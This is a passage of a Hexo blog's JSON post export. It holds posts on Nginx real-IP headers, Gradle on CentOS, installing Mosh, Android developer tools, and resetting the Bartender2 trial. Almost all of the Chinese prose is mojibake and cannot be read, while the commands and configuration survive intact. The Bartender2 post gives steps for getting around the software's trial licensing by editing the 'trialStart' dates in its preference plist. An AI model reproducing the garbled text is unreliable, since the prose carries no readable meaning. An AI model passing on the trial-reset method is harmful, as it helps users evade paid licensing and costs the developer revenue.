¼ï¼Œyamlå¤„ç†å‡ºé”™ã€‚å‚è€ƒ æèµ æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://blog.chaosjohn.com/tags/hexo/"}]},{"title":"Nginxåå‘ä»£ç†è·å–çœŸå®å®¢æˆ·ç«¯IP","slug":"Nginx-Real-Client-IP","date":"2017-10-09T02:51:57.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Nginx-Real-Client-IP.html","link":"","permalink":"https://blog.chaosjohn.com/Nginx-Real-Client-IP.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ èµ·å›  æ­¤å‰åšäº†ä¸€ä¸ªå°é¡¹ç›®ï¼Œphpå®ç°ï¼Œip.chaosjohn.com, å¯ä»¥ç”¨å‘½ä»¤è¡Œæ¥è·å–å½“å‰å®¢æˆ·ç«¯ipåœ°å€ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š ä¹‹å‰æ˜¯ç”¨CaddyServeræ¥è¿è¡Œè¿™ä¸ªæœåŠ¡ï¼Œæœ€è¿‘æŠŠå…¶ä»CaddyServerè¿ç§»åˆ°nginxï¼Œå¾ˆé¡ºåˆ©çš„è¿ç§»æˆåŠŸã€‚ä»¥å­¦ä¹ ä¸ºç›®çš„ï¼Œæˆ‘åœ¨è¯¥æœåŠ¡å™¨ä¸Šç”¨å¦å¤–ä¸€ä¸ªåœ°å€ip.vultr-01.coodiin.comï¼ˆä»¥ä¸‹ç§°â€œåä»£ç«¯â€ï¼‰åå‘ä»£ç†åˆ°ip.chaosjohn.comï¼ˆä»¥ä¸‹ç§°â€œåç«¯â€ï¼‰ï¼Œå´å‡ºç°é—®é¢˜äº†ï¼Œipè¯»å–ä¸æ­£ç¡®ï¼Œæ˜¾ç¤ºçš„æ˜¯æœåŠ¡å™¨çš„IPã€‚Nginxé…ç½®å¦‚ä¸‹ï¼š é—®é¢˜åˆ†æ å‡ºç°è¿™æ ·çš„æƒ…å†µçš„åŸå› æ˜¯å› ä¸ºï¼Œåœ¨åå‘ä»£ç†çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹äºåç«¯è€Œè¨€ï¼Œåä»£ç«¯å°±æ˜¯å®¢æˆ·ç«¯ã€‚ è§£å†³ è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåˆ™éœ€è¦æŠŠçœŸå®çš„å®¢æˆ·ç«¯åœ°å€å‘Šè¯‰åç«¯ã€‚é‚£åä»£ç«¯å’Œåç«¯æ€ä¹ˆæ²Ÿé€šçœŸå®çš„IPåœ°å€å‘¢ï¼Ÿä¸€ä¸ªè¯´å¦ä¸€ä¸ªå¾—å¬å§ï¼Œä¸¤è¾¹éƒ½è¦è®¾ç½®ã€‚ åä»£ç«¯ proxy_set_header X-Real-IP $remote_addr; # è®¾ç½®X-Real-IPä¸ºçœŸå®æ¥æºè¯·æ±‚çš„IPåœ°å€ proxy_bind 127.0.0.1; # è§„å®šä»£ç†è¯·æ±‚çš„å‡ºå£åœ°å€ åç«¯ set_real_ip_from 127.0.0.1/32; # åªæœ‰ä»è¿™ä¸ªåœ°å€æ¥çš„è¯·æ±‚æ‰ä¼šè®¾ç½®çœŸå®IPï¼Œæ‰ä¼šåº”ç”¨X-Real-IPè¿™ä¸ªheader æœ€åçš„ä»£ç  4. ç»“è¯­ä¸‹æ¬¡æ‰“ç®—è®°å½•ä¸€ä¸‹phpçš„é…ç½®ï¼ŒåŒ…å«Nginxå’ŒCaddyServerã€‚æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://blog.chaosjohn.com/tags/Nginx/"}]},{"title":"ç ´è§£Macèœå•æ ç¥å™¨ -- Bartender2","slug":"Crack-Bartender2","date":"2016-11-04T06:59:31.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Crack-Bartender2.html","link":"","permalink":"https://blog.chaosjohn.com/Crack-Bartender2.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ é¢˜å¤–è¯çœŸçš„å¥½ä¹…å¥½ä¹…æ²¡æœ‰æ›´æ–°blogäº†ï¼Œä¸Šç¯‡åšå®¢è¿˜æ˜¯ä»Šå¹´5æœˆ30å·ã€‚è™½ç„¶å¥½å‡ æ¬¡æƒ³æ›´ä¸¤ç¯‡ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚æ‡’ç™Œæ™šæœŸã€‚ã€‚ã€‚å“ˆå“ˆå“ˆï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œè¿›å…¥æ­£æ–‡ã€‚ è½¯ä»¶ä»‹ç»Bartenderæ˜¯ä¸€æ¬¾ç®¡ç†macèœå•æ å›¾æ ‡çš„è½¯ä»¶ï¼Œç¬”è€…çš„macè£…äº†å¾ˆå¤šå¾ˆå¤šçš„åº”ç”¨ï¼Œå¾ˆå¤šéƒ½ä¼šåœ¨èœå•æ é‡Œåœé©»ä¸€ä¸ªå›¾æ ‡ï¼Œç„¶åé¡¶éƒ¨çš„èœå•æ æ‚²å‰§çš„æŒ¤æ»¡äº†ã€‚ã€‚ã€‚ç”¨Windowsçš„ç«¥é‹éƒ½çŸ¥é“ï¼Œåœ¨æ¡Œé¢ä»»åŠ¡æ å³ä¸‹è§’éƒ½ä¼šæœ‰ä¸€ç®­å¤´ï¼Œæ”¶èµ·æ—¶åªæ˜¾ç¤ºå‡ ä¸ªå¸¸é©»çš„å›¾æ ‡ï¼Œç‚¹å‡»åå…¶ä»–éšè—çš„å›¾æ ‡æ‰ä¼šå‡ºç°ã€‚ä¸€ç›´æä¸æ˜ç™½ä¸ºä»€ä¹ˆè‹¹æœåŸç”Ÿä¸èƒ½å¢åŠ ä¸€ä¸ªè¿™æ ·çš„åŠŸèƒ½å‘¢ï¼Ÿåº”è¯¥ä¹Ÿä¸æ˜¯ä»€ä¹ˆéš¾äº‹å‘€ï¼Bartenderå®ç°çš„å°±æ˜¯è¿™ä¸ªåŠŸèƒ½ã€‚å…³äºBartenderçš„è¯¦ç»†ä»‹ç»ç§»æ­¥å°‘æ•°æ´¾ ç ´è§£çš„ç¼˜ç”± ç¬”è€…å…¶å®å¾ˆæ„¿æ„ä¸ºè½¯ä»¶èŠ±é’±ï¼ˆå‰ææ˜¯åœ¨æ‰¿å—èŒƒå›´å†…å“ˆå“ˆå“ˆï¼‰ï¼Œè‡ªæ‰“å¤§å››è¿›å…¥å·¥ä½œä»¥æ¥ï¼Œåœ¨å„ç±»è½¯ä»¶&amp;æœåŠ¡ä¸ŠèŠ±çš„é’±ä¹Ÿæœ‰ä¸€ä¸¤åƒäº†ã€‚æ¯”å¦‚ï¼ŒBartenderç¬¬ä¸€ä»£ï¼Œæˆ‘å°±èŠ±äº†$15ã€‚ç„¶åå°±ä¸€ç›´ä½¿ç”¨åˆ°ä»Šå¹´ï¼Œä¸€ç›´ç›¸å®‰æ— äº‹ï¼Œç›´åˆ°Bartenderå‡ºäº†ç¬¬äºŒä»£ï¼Œä¼˜åŒ–äº†ç•Œé¢æ˜¾ç¤ºä»¥åŠåŠ äº†äº›å°åŠŸèƒ½ï¼Œä½†æ˜¯éƒ½æ²¡æˆ³ä¸­æˆ‘ç—›ç‚¹ï¼Œæ‰€ä»¥å°±ä¸€ç›´æ²¡æœ‰å»æ”¹ç”¨Bartender2ã€‚ ä½†æ˜¯ï¼Œ9æœˆä¸‹æ—¬macæ›´æ–°äº†æ“ä½œç³»ç»ŸmacOS Sierraï¼Œå‡çº§å®Œå¾ˆæ‚²å‰§çš„å‘ç°ï¼ŒBartender1å·²ç»ä¸å…¼å®¹æ”¹æ“ä½œç³»ç»Ÿäº†ï¼Œè€Œä¸”æ˜¾ç„¶ï¼Œä½œè€…æŠŠé‡å¿ƒæ”¾åœ¨äº†Bartender2ä¸Šï¼Œä¼°è®¡ä¹Ÿä¸ä¼šæ›´æ–°Bartender1äº†ã€‚ä¸å¾—å·²ï¼Œåªå¥½å¸è½½äº†1å®‰è£…ä¸Šäº†2ã€‚ç»“æœå‘ç°ï¼Œ1çš„åºåˆ—å·ä¸èƒ½å†2ä¸Šä½¿ç”¨ï¼Œå¾—é‡æ–°è´­ä¹°($15)æˆ–è€…ä»1å‡çº§åˆ°2($7.5)ã€‚ã€‚ã€‚å¤©æ€çš„ï¼ï¼ï¼ è¿˜å¥½æœ‰4ä¸ªæ˜ŸæœŸçš„è¯•ç”¨æœŸï¼Œå°±å…ˆç”¨ç€äº†ã€‚ã€‚ã€‚ä½†æ˜¯ç”¨ç€ä¸€ä¸ªä¼šåˆ°æœŸçš„æœåŠ¡ï¼Œé‚£æ„Ÿè§‰ï¼Œå°±åƒå¤´ä¸Šæ‚¬ç€æŠŠåˆ€ï¼Œå¾ˆä¸æ˜¯æ»‹å‘³ã€‚ã€‚ã€‚äºæ˜¯æˆ‘å°±å¼€å§‹æ€è€ƒï¼šå®ƒæ˜¯æ€ä¹ˆè®¡ç®—è¯•ç”¨æ—¶é—´çš„ï¼Ÿ ä¸€ç•ªæ£é¼“åï¼Œè¯•ç”¨æ—¶é—´è¢«æˆ‘æˆåŠŸé‡ç½®ï¼Œä½†æ˜¯ä¸çŸ¥é“è¿™ä¸ªæ¼æ´ä¼šä¸ä¼šè¢«å°å µæ‰ï¼Œæ‰€ä»¥ç›´åˆ°ä»Šå¤©è¢«æˆ‘å†æ¬¡é‡ç½®å(æœŸé—´Bartender2å·²ç»å‡çº§äº†å¥½å‡ ä¸ªç‰ˆæœ¬)ï¼Œæˆ‘æ‰ç¡®å®šäº†æˆ‘çš„ç ´è§£æ–¹æ³•çš„å¯è¡Œæ€§ã€‚ ç ´è§£è¿‡ç¨‹ å‡è®¾Bartender2è¯•ç”¨æ—¶é—´å·²è¿‡æœŸ å…³é—­Bartender2ï¼Œæ‰“å¼€AppCleanerï¼Œæ‰¾åˆ°Bartender2é‚£é¡¹ï¼Œç‚¹å‡»å®ƒï¼Œä¼šå¼¹å‡ºä¸€ä¸ªçª—å£ï¼Œé‡Œé¢ä¼šç½—åˆ—å‡ºä¸è¯¥åº”ç”¨ç›¸å…³çš„æ‰€æœ‰é…ç½®æ–‡ä»¶ç­‰ç­‰ã€‚ ç»çŒœæµ‹é”å®šâ€com.surteesstudio.Bartender.plistâ€ï¼Œæ‰“å¼€ç¿»åˆ°æœ€åï¼Œæœç„¶çœ‹åˆ°â€œtrialStartâ€è¿™æ ·çš„å­—æ ·ï¼Œå“ˆå“ˆå“ˆã€‚ ç”¨ç¼–è¾‘å™¨æ‰“å¼€(ç¬”è€…ç”¨çš„XCodeï¼Œå› ä¸ºä¸Šæ¬¡ç›´æ¥ç”¨Vimç¼–è¾‘ä¿å­˜åBartenderä¸èƒ½è¯†åˆ«ï¼‰ï¼ŒæŠŠâ€trialStartâ€å’Œâ€trialStart2â€æ”¹æˆå½“å‰æ—¥æœŸçš„å‰ä¸¤å¤©. å¤§åŠŸå‘Šæˆ ç»“è¯­æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"Crack","slug":"Crack","permalink":"https://blog.chaosjohn.com/tags/Crack/"},{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"}]},{"title":"è§£å†³â€œGradle -- Could not find tools.jarâ€","slug":"Gradle-Could-not-find-tools-jar","date":"2016-05-30T06:48:44.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Gradle-Could-not-find-tools-jar.html","link":"","permalink":"https://blog.chaosjohn.com/Gradle-Could-not-find-tools-jar.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ é”™è¯¯å‡ºç°çš„ç¯å¢ƒ CentOS 7 x86_64 å·²é€šè¿‡sudo yum install java-1.8.0-openjdkå®‰è£…OpenJDK8 éƒ¨ç½²å®Œæˆçš„Spring-Booté¡¹ç›®ï¼Œæ‰§è¡Œ./gradlew bootRun æŠ¥é”™`Could not find tools.jar è¯¥é¡¹ç›®åœ¨å…¶ä»–çš„æœºå™¨ä¸Šå‡æœªå‡ºç°è¯¥é—®é¢˜ï¼ŒåŒ…æ‹¬OSXã€Ubuntuå’Œå¦ä¸€å°CentOS è§£å†³æ–¹æ¡ˆ ç»StackOverFlowæœç´¢ï¼Œå‘ç°Gradle does not find tools.jarå’ŒCorrect way of referencing tools.jar in a cross-platform wayä¸¤ç¯‡ï¼Œä¸»è¦æ˜¯é€šè¿‡æ”¹build.gradleï¼Œå¼ºåˆ¶åŠ å…¥toolsçš„æœå¯»è·¯å¾„æ¥è§£å†³é—®é¢˜ã€‚ç›®æµ‹æœ‰æ•ˆï¼Œä½†æ˜¯å› ä¸ºåœ¨å…¶ä»–æœºå­ä¸Šéƒ½æ­£å¸¸è¿è¡Œä¸æŠ¥é”™ï¼Œæ‰€ä»¥æ”¾å¼ƒè¯¥æ–¹æ¡ˆã€‚ çªç„¶æƒ³èµ·æ¥åœ¨å¾ˆå¤šæƒ…å†µä¸‹æŠ¥é”™éƒ½æ˜¯å› ä¸ºæ²¡æœ‰å®‰è£…devåŒ…ï¼ˆæˆ–develåŒ…ï¼‰ï¼Œæ¯”å¦‚pipå®‰è£…æ¨¡å—å´æ²¡æœ‰å®‰è£…python-devç­‰ç­‰ã€‚å°±å¯»æ€ç€ï¼ŒOpenJDKä¼šä¸ä¼šä¹Ÿè¦å®‰è£…devç»„ä»¶å‘¢ï¼Ÿ é”®å…¥sudo yum search openjdk | grep -i devè¿›è¡Œæœç´¢ï¼Œæœç„¶æœ‰java-1.8.0-openjdk-devel sudo yum install java-1.8.0-openjdk-develï¼Œå†æ¬¡./gradlew bootRunï¼ŒæˆåŠŸè¿è¡Œä¸æŠ¥é”™ ç»“è¯­å¼€å‘è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜äº†ï¼Œä¸ä»…è¦å‹¤æœç´¢ï¼Œè¿˜è¦å‹¤åŠ¨è„‘æ€è€ƒã€‚æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://blog.chaosjohn.com/tags/Java/"},{"name":"Gradle","slug":"Gradle","permalink":"https://blog.chaosjohn.com/tags/Gradle/"},{"name":"Error","slug":"Error","permalink":"https://blog.chaosjohn.com/tags/Error/"}]},{"title":"Mosh(Mobile Shell) -- å¢å¼ºç‰ˆSSH","slug":"Mosh-Imporved-SSH","date":"2016-05-30T06:25:15.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Mosh-Imporved-SSH.html","link":"","permalink":"https://blog.chaosjohn.com/Mosh-Imporved-SSH.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ å¼€åœºç™½ Moshï¼Œæ˜¯Mobile Shellçš„ç¼©å†™(Mo+Sh)ï¼Œæ˜¯ä¸€ä¸ªå¢å¼ºç‰ˆçš„SSHï¼Œæˆ–è€…å¥—ç”¨å®˜æ–¹çš„è¯æ¥è¯´ï¼ŒMosh is a replacement for SSHã€‚ SSHç›¸ä¿¡å¤§å®¶åº”è¯¥éƒ½ä¸é™Œç”Ÿï¼Œæˆ‘ä»¬éƒ½ç”¨å®ƒæ¥è¿›è¡Œè¿œç¨‹ç™»å½•Unix-likeçš„æ“ä½œç³»ç»Ÿï¼Œæ¯”å¦‚è¿è¡Œç€Linuxçš„äº‘æœåŠ¡å™¨ã€‚ SSHæœ‰ä¸€ä¸ªå¾ˆå¤§çš„å¼Šç—…ï¼Œé‚£å°±æ˜¯è¿æ¥ä¼šæ–­ã€‚æ¯”å¦‚æ–°å»ºäº†ä¸€ä¸ªSSHä¼šè¯ï¼Œç„¶åçªç„¶ç½‘æ–­äº†ï¼ŒSSHå°±æ–­å¼€è¿æ¥ç»ˆæ­¢äº†ã€‚ Moshå°±æ˜¯ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„ï¼Œå®ƒå¯ä»¥â€œæ¼«æ¸¸â€ã€‚ç½‘æ–­äº†ï¼Œé‡è¿ï¼Œæˆ–è€…ä»ä¸€ä¸ªWiFiåˆ‡æ¢åˆ°å¦ä¸€ä¸ªWiFiï¼Œç„¶ååˆåˆ‡æ¢æˆæ•°æ®æµé‡ï¼Œä¼šè¯ä¸€ç›´éƒ½åœ¨ã€‚ å¦å¤–ä¸€ä¸ªç¬”è€…éå¸¸å–œæ¬¢çš„ç‰¹ç‚¹æ˜¯â€“æœ¬åœ°å“åº”ç‰¹åˆ«å¿«(intelligent local echo)ã€‚ç¬”è€…æœ‰å¥½å‡ å°å›½å¤–çš„æœåŠ¡å™¨ï¼Œå‡ ä¹éƒ½æ˜¯ç¾å›½çš„ã€‚ä»ä¸­å›½å¤§é™†åˆ°ç¾å›½çš„Pingå€¼ä¸€èˆ¬éƒ½è¶…è¿‡200msï¼Œæœ‰æ—¶å€™ç”šè‡³åœ¨400msä»¥ä¸Šï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å¯¹æ¯”SSHä¸Moshçš„è¡¨ç°ï¼š SSHï¼šé”®ç›˜æŒ‰ä¸‹æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚â€œaâ€ï¼Œè¿œç¨‹æœåŠ¡å™¨æ¥æ”¶åˆ°æœ¬åœ°é”®ç›˜çš„å“åº”ï¼Œç„¶åå†å‘Šè¯‰æœ¬åœ°â€œè¿™è¾¹å·²æ¥åˆ°ä½ æŒ‰ä¸‹å­—æ¯aâ€ï¼Œè¿™ä¹‹åï¼Œæœ¬åœ°çš„ç»ˆç«¯æ‰ä¼šæ˜¾ç¤ºå‡ºå­—æ¯aã€‚å‡è®¾Pingå€¼æ˜¯200msï¼Œé‚£ä¹ˆæ¯æ¬¡æŒ‰ä¸‹æŒ‰é”®ä¹‹åï¼Œå¾—æœ‰400msçš„å»¶è¿Ÿå±å¹•æ‰æœ‰æ˜¾ç¤ºï¼Œsoï¼Œæ‰“å­—ä¸€å¡ä¸€å¡çš„å¾ˆéš¾å—ï¼Œä½“éªŒå¾ˆç³Ÿç³•ã€‚ Moshï¼šé”®ç›˜æ¯æŒ‰ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œå±å¹•ä¸Šç«‹é©¬å°±ä¼šæ˜¾ç¤ºï¼Œå‘é€ç»™è¿œç¨‹æœåŠ¡å™¨çš„å·¥ä½œåˆ™åœ¨åå°é™é»˜æ‰§è¡Œï¼Œæ‰“å­—éå¸¸æµç•…ã€‚ å®‰è£… Mac OS X ä»pkgè½¯ä»¶åŒ…å®‰è£…ï¼šOS X 10.5â€“10.9 &amp;&amp; OS X 10.9+ HomeBrewï¼š$ brew install mosh MacPortsï¼š$ sudo port install mosh Windows - Cygwin: C:\\&gt; setup.exe -q mobile-shell Chromeæµè§ˆå™¨ï¼šæ’ä»¶Mosh for Chrome Linux Ubuntu/Debian: $ sudo apt-get install mosh ArchLinux: $ sudo pacman -S mosh CentOS/Fedaroï¼š$ sudo yum install mosh FreeBSD: $ sudo pkg install net/mosh ç¼–è¯‘å®‰è£… ä¸‹è½½æºç åŒ…è¿›è¡Œ 123456$ wget https://mosh.mit.edu/mosh-1.2.5.tar.gz$ tar xvzf mosh-1.2.5.tar.gz$ cd mosh-1.2.5$ ./configure$ make# make install ä»gitæ‹‰å–æºç  123456$ git clone https://github.com/mobile-shell/mosh$ cd mosh$ ./autogen.sh$ ./configure$ make# make install ä½¿ç”¨æ–¹æ³• åŸºæœ¬ä¸Šå’ŒSSHä¸€æ¨¡ä¸€æ ·ï¼Œç›´æ¥$ mosh server-addresså°±å¥½äº†ï¼Œå› ä¸ºMoshçš„æœ¬è´¨è¿˜æ˜¯SSH å¦‚æœè¿œç¨‹ä¸»æœºçš„SSHç«¯å£ä¸æ˜¯22ï¼Œæ¯”å¦‚æ˜¯2022ï¼Œåˆ™éœ€è¦$ mosh remotehost --ssh=&quot;ssh -p 2022&quot; ä¸€èˆ¬æ¥è¯´ï¼Œè¿œç¨‹ä¸»æœºçš„ç¯å¢ƒè¦é…ç½®æˆen_US.UTF-8ï¼Œä¸ç„¶ä¼šæŠ¥â€œmosh requires a UTF-8 locale.â€ä¹‹ç±»çš„å¼‚å¸¸ï¼Œæ ¹æœ¬ç”¨ä¸äº†ã€‚ç¢ç£¨äº†å¥½ä¹…ï¼Œç ”ç©¶å‡ºä¸€å¥—å¤šå¹³å°çš„è§£å†³æ–¹æ¡ˆã€‚ Linux 12341. åœ¨/etc/environmentä¸­è¿½åŠ ä¸€å¥LC_ALL=&quot;en_US.UTF-8&quot;2.A [Ubuntu/Debian] $ sudo locale-gen en_US.UTF-8 2.B [CentOS/Fedaro] $ sudo localedef -v -c -i en_US -f UTF-8 en_US.UTF-83. reboot FreeBSDï¼šåªéœ€åœ¨~/.login_confä¸­è¿½åŠ  1234me:\\ :charset=UTF-8:\\ :lang=en_US.UTF-8:\\ :setenv=LC_COLLATE=C: è¸©å‘ é”™è¯¯Nothing received from the server on UDP port 60003ï¼šç®€å•æ¥è¯´ï¼ŒMoshçš„ç½‘ç»œé€šä¿¡ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼ŒTCPç”¨äºSSHä¼šè¯+UDPç”¨äºä¼šè¯ä¿æŒã€‚TCPéƒ¨åˆ†çš„ç«¯å£å°±æ˜¯SSHçš„ç«¯å£ï¼Œè€ŒUDPçš„ç«¯å£åˆ™æ˜¯60000~61000ä¹‹é—´çš„éšæœºæ•°ã€‚è¯¥é”™è¯¯çš„è§£å†³æ–¹æ¡ˆå°†UDPç«¯å£åŠ å…¥é˜²ç«å¢™çš„ç™½åå•$ sudo iptables -I INPUT 1 -p udp --dport 60000:61000 -j ACCEPT ç¬”è€…å®¶é‡Œçš„é‚£å°è€MacBookä½œä¸ºæ–‡ä»¶æœåŠ¡å™¨ï¼Œå¸¸å¹´å¼€ç€ä¸å…³æœºï¼Œä½†æ˜¯ä»å¤–ç½‘é€šè¿‡Moshè®¿é—®å›å»ï¼Œä¼šå‡ºç°æ‰¾ä¸åˆ°mosh-serverçš„å¼‚å¸¸ã€‚åŸå› æ˜¯ç¬”è€…ç”¨HomeBrewå®‰è£…çš„Moshï¼Œæ‰§è¡Œæ–‡ä»¶è¢«é»˜è®¤æ”¾åœ¨/usr/local/bin/ä¸‹ï¼Œåœ¨é«˜ç‰ˆæœ¬çš„OSXä¸‹ï¼Œå› å®‰å…¨æ–¹é¢çš„è€ƒè™‘ï¼Œè¯¥è·¯å¾„ä¸åœ¨ç³»ç»Ÿçš„åˆå§‹PATHé‡Œï¼Œæ‰€ä»¥ä¼šæ‰¾ä¸åˆ°mosh-serverã€‚è§£å†³æ–¹æ³•æ˜¯â€œæ˜¾å¼æŒ‡å®šæ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„â€ï¼š1$ mosh macbook --server&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;mosh-server ç»“è¯­è‡ªä»ä¸¤å¹´å‰å‘ç°äº†è¿™ä¹ˆä¸ªåˆ©å™¨ï¼Œåœ¨ç¬”è€…çš„æ—¥å¸¸è¿ç»´ä¸­ï¼Œå®ƒå·²ç»å®Œå…¨æ›¿ä»£äº†SSHçš„å­˜åœ¨ã€‚æœ€åï¼Œå¦‚æœè¯¥æ–‡å¯¹è¯»è€…æœ‰äº›è®¸å¸®åŠ©ï¼Œè€ƒè™‘ä¸‹ç»™ç‚¹æåŠ©é¼“åŠ±ä¸€ä¸‹å‘—ğŸ˜Š","categories":[],"tags":[{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"Dev","slug":"Dev","permalink":"https://blog.chaosjohn.com/tags/Dev/"}]},{"title":"å®‰å“å¹³æ¿ä¸Šçš„å¼€å‘è€…å®ç”¨å·¥å…·","slug":"Tools-for-Developers-on-Android-Tablet","date":"2016-05-29T08:52:15.000Z","updated":"2023-10-17T02:45:27.000Z","comments":true,"path":"Tools-for-Developers-on-Android-Tablet.html","link":"","permalink":"https://blog.chaosjohn.com/Tools-for-Developers-on-Android-Tablet.html","excerpt":"","text":"æ¬¢è¿è½¬è½½ï¼Œä½†è¯·åœ¨å¼€å¤´æˆ–ç»“å°¾æ³¨æ˜åŸæ–‡å‡ºå¤„ã€blog.chaosjohn.comã€‘ 1. æµ‹è¯•æœºå‹å’Œæœ¬æ–‡çš„å—ä¼— ä½ å¾—æœ‰ä¸€å—androidå¹³æ¿ï¼Œæˆ–è€…ä¸€åªè¶…å¤§å±çš„androidæ‰‹æœº(ç±»ä¼¼å°ç±³MAXï¼Œå…¶å®å°ç±³Noteä¹Ÿå‡‘åˆ)ã€‚ ä½ è¿˜å¾—æ˜¯ä¸ªå¼€å‘è€…ï¼Œæœ¬æ–‡ä»‹ç»çš„å·¥å…·éƒ½æ˜¯ä¸ºå¼€å‘è€…å‡†å¤‡ï¼Œå¦‚æœä½ ä¸æ˜¯ï¼Œè¯·æ‹‰åˆ°æ–‡ç« æœ«å°¾ï¼Œå°±åªç»™ä½ å®‰åˆ©GMD GestureControlè¿™ä¸€ä¸ªè½¯ä»¶å•¦ğŸ™ˆã€‚ æœ¬æ–‡å°é¢çš„æ˜¯ç¬”è€…çš„å°ç±³å¹³æ¿ç¬¬ä¸€ä»£64Gç‰ˆï¼Œäº15å¹´â€œåŒåä¸€â€èŠ±1099å—å¤§æ´‹ä¹°äº†é€ç»™å¥³æœ‹å‹çš„ï¼Œåæ¥å…¬å¸å¹´ç»ˆæŠ½å¥–æŠ½åˆ°ä¸€å—iPad mini2ï¼Œå°±ä»å¥³æœ‹å‹æ‰‹é‡ŒæŠŠè¿™å—å®‰å“æ¿å­æ¢å›æ¥äº†ï¼ˆç¬”è€…æ˜¯æ ‡å‡†çš„æš–ç”·åš¯åš¯åš¯ï¼‰ã€‚ ç¬”è€…ç»å¯¹æ²¡æœ‰ç»™å°ç±³æ‰“å¹¿å‘Šï¼Œç›¸åé™¤äº†è¿™å—MiPadä¹‹å¤–ï¼Œç¬”è€…åªæƒ³ç‹ ç‹ åœ°é»‘å°ç±³ï¼Œæ¯”å¦‚å°ç±³MAXâ€“è¿™è´§åˆ°åº•æ˜¯æ‰‹æœºè¿˜æ˜¯å¹³æ¿å•Šï¼›æ¯”å¦‚è¯´å…¬å¸èŠ±3000å—é’±ä¹°å›æ¥çš„å°ç±³Noteé¡¶é…ç‰ˆâ€“ç‰¹å–µçš„ä¸€å¤©ä¸‰å……è€Œä¸”æœç„¶â€œä¸ºå‘çƒ§è€Œç”Ÿâ€ã€‚ åªæœ‰è¿™å—14å¹´é—®ä¸–çš„MiPadï¼Œç”¨ä¸‹æ¥è§‰å¾—è¿˜å¥½ï¼Œç»­èˆªå¾ˆç»™åŠ›ï¼Œè€Œä¸”â€œNVIDIA Tegra K1â€çš„CPUï¼Œæ”¾åˆ°ç°åœ¨16å¹´ä¸­æ—¬ï¼Œè¿˜èƒ½æ’ä¸Šå·ã€‚ ç¬”è€…è™½ç„¶æ˜¯æœç²‰ï¼Œä½†æ˜¯ç»å¯¹ä¸é„™è§†androidï¼Œç›¸ååœ¨å„ç±»å¹³æ¿ä¸­é€‰æ‹©çš„è¯ï¼Œæˆ‘è¿˜æ˜¯æ¯”è¾ƒåå¥½androidçš„ã€‚åŸå› æ— ä»–ï¼Œç”¨çš„é¡ºæ‰‹ã€‚ï¼ˆä»¥åæˆ‘ä¼šå†™ç¯‡æ–‡ç« è®²è®²æˆ‘ä¸ºä»€ä¹ˆå¹³æ¿é€‰æ‹©androidï¼Œè€Œæ‰‹æœºå´é€‰æ‹©iPhoneï¼‰ 2. ç³»ç»Ÿç‰ˆæœ¬ å°ç±³å¹³æ¿å˜›ï¼Œå‡ºå‚å¿…é¡»è‡ªå¸¦MIUIæ»´ã€‚ æƒ³æŠŠå°ç±³å¹³æ¿å˜æˆâ€œPCâ€ï¼Œè¿˜åˆ·è¿‡ä¸€æ¬¡RemixOSï¼Œä½†æ˜¯å› 